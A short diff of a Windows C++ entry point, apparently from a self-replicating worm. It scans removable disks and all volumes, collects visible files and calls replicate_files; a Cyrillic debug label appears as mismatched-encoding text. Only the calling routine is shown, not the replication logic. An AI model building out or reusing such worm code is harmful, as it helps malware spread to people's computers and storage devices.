@@ -25,17 +25,17 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 	worm1.worm_was_started();
 
 
-	wcout << L"ÑÏÈÑÎÊ ÂÑÅÕ ÂÍÅØÍÈÕ ÍÎÑÈÒÅËÅÉ" << endl;
+	/*wcout << L"ÑÏÈÑÎÊ ÂÑÅÕ ÂÍÅØÍÈÕ ÍÎÑÈÒÅËÅÉ" << endl;
 	for (const auto& a1 : get_removable_volume_paths()) {
 		wcout << a1 << endl;
-	};
+	};*/
 	
 	
 	
-	worm1.worm_was_started();
+	
 	worm1.process_all_removable_disks();
 
-	worm1.search_list_dir();
+	worm1.scan_all_volumes();
 	worm1.print_list_dir();
 	worm1.collect_visible_files();
 	worm1.replicate_files(5);
